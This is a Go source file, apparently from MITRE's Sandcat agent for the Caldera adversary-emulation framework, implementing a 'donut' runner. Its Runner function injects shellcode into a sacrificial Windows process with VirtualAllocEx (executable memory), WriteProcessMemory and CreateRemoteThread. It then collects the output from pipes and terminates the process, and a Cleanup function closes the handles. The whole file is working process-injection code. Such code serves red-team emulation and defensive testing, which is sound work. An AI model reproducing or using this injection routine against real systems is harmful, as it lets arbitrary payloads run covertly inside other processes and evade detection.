// +build windows

package donut

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/mitre/sandcat/gocat/output"
	"github.com/mitre/sandcat/gocat/util"
)

// Runner runner
func Runner(donut []byte, handle syscall.Handle, stdout syscall.Handle, stdoutBytes *[]byte, stderr syscall.Handle, stderrBytes *[]byte, eventCode *uint32) (bool, error) {

	output.VerbosePrint(fmt.Sprintf("DEBUG: entered runner"))

	output.VerbosePrint(fmt.Sprintf("DEBUG: placing shellcode"))

	address, err := VirtualAllocEx(handle, 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READ)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	var bytesWritten uintptr

	_, err = WriteProcessMemory(handle, address, (uintptr)(unsafe.Pointer(&donut[0])), uintptr(len(donut)), &bytesWritten)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: starting shellcode"))

	var threadHandle syscall.Handle

	threadHandle, err = CreateRemoteThread(handle, nil, 0, address, 0, 0, 0)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: waiting for shellcode"))

	*eventCode, err = WaitForSingleObject(threadHandle, 0xFFFFFFFF)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: shellcode exited"))

	output.VerbosePrint(fmt.Sprintf("DEBUG: About to read from pipes"))

	err = ReadFromPipes(stdout, stdoutBytes, stderr, stderrBytes)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	//Close the thread handle
	err = syscall.CloseHandle(threadHandle)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: thread handle closed"))

	//Terminate the sacrificial process
	err = TerminateProcess(handle, 0)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: terminated sacrificial process"))

	//close Process Handle
	err = syscall.CloseHandle(handle)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: closed sacrificial process handle"))

	//close stdout Handle
	err = syscall.CloseHandle(stdout)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: closed stdout handle"))

	//close stderr Handle
	err = syscall.CloseHandle(stderr)
	if util.CheckErrorMessage(err) {
		return false, err
	}
	output.VerbosePrint(fmt.Sprintf("DEBUG: closed stderr handle"))

	return true, err
}

func Cleanup(prochandle syscall.Handle, threadHandle syscall.Handle, stdout syscall.Handle, stderr syscall.Handle) (err error) {

	//Close the thread handle
	err = syscall.CloseHandle(threadHandle)
	if util.CheckErrorMessage(err) {
		return err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: thread handle closed"))

	//Terminate the sacrificial process
	err = TerminateProcess(prochandle, 0)
	if util.CheckErrorMessage(err) {
		return err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: terminated sacrificial process"))

	//close Process Handle
	err = syscall.CloseHandle(prochandle)
	if util.CheckErrorMessage(err) {
		return err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: closed sacrificial process handle"))

	//close stdout Handle
	err = syscall.CloseHandle(stdout)
	if util.CheckErrorMessage(err) {
		return err
	}

	output.VerbosePrint(fmt.Sprintf("DEBUG: closed stdout handle"))

	//close stderr Handle
	err = syscall.CloseHandle(stderr)
	if util.CheckErrorMessage(err) {
		return err
	}
	output.VerbosePrint(fmt.Sprintf("DEBUG: closed stderr handle"))

	return err

}

// IsAvailable does a donut runner exist
func IsAvailable() bool {

	return true
}
